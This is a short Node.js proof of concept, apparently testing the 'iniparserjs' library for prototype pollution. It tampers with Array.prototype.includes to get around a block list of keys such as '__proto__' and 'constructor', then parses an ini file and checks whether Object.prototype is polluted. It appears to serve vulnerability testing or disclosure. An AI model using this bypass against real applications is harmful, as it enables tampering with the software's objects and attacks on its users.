Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
var path = require('path');
var IniParser = require('iniparserjs');
var config = new IniParser(path.join(__dirname, 'test.ini'), 'UTF8');
console.log({}.polluted);